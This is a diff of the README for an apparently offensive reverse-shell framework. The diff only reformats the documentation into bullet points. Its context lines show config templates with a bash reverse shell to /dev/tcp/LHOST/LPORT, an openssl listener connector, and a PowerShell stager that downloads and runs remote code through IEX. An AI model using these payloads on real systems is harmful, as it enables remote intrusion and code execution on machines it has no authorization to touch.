@@ -108,11 +108,11 @@ required_opts=LHOST;LPORT
 connector=reverse_tcp_netcat
 payload=/bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1
 ```
-Create a similar file, the uppercase keywords will be replaced with the data passed as parameters.
-Available params: LHOST, LPORT, PARAM1, PARAM2
-required contains the required parameters for the payload.
-Use an existent connector.
-If you need to configure a mulltilne payload (used with stagers), use multiline. Next payload and finish with %%payload_end%%
+* Create a similar file, the uppercase keywords will be replaced with the data passed as parameters.
+* Available params: LHOST, LPORT, PARAM1, PARAM2
+* required contains the required parameters for the payload.
+* Use an existent connector.
+* If you need to configure a mulltilne payload (used with stagers), use multiline. Next payload and finish with %%payload_end%%
 
 ### Connectors
 ```
@@ -123,12 +123,12 @@ app=/usr/bin/openssl
 params=s_server;-quiet;-key;/opt/shelly/repo/auxiliary/key.pem;-cert;/opt/shelly/repo/auxiliary/cert.pem;-port;LPORT
 pre_exec=
 ```
-Create a similar file, the uppercase keywords will be replaced with the data passed as parameters.
-Available params: LHOST, LPORT, PARAM1, PARAM2
-required_opts contains the required parameters for the connector.
-app contains connector binary path.
-params passed to the connector splitted by semicolons.
-pre_exec will contain a command executed just before launching the connector.
+* Create a similar file, the uppercase keywords will be replaced with the data passed as parameters.
+* Available params: LHOST, LPORT, PARAM1, PARAM2
+* required_opts contains the required parameters for the connector.
+* app contains connector binary path.
+* params passed to the connector splitted by semicolons.
+* pre_exec will contain a command executed just before launching the connector.
 
 ### Stagers
 Only HTTP stagers working  at the  moment.
@@ -139,10 +139,10 @@ required_opts=LHOST;SPORT
 http_requests=1
 payload=echo IEX(New-Object Net.WebClient).DownloadString('http://LHOST:SPORT/FILENAME') | powershell -nop -
 ```
-Create a similar file, the uppercase keywords will be replaced with the data passed as parameters.
-Available params: LHOST, SPORT, PARAM1, PARAM2
-required_opts contains the required parameters for the stager.
-http_resquests usually mus be 1, if not working try 2 or higher value.
+* Create a similar file, the uppercase keywords will be replaced with the data passed as parameters.
+* Available params: LHOST, SPORT, PARAM1, PARAM2
+* required_opts contains the required parameters for the stager.
+* http_resquests usually mus be 1, if not working try 2 or higher value.
 
 ### External scripts used on this project as payloads
 * [PowerCat.ps1](https://github.com/besimorhino/powercat) from Besimorinho
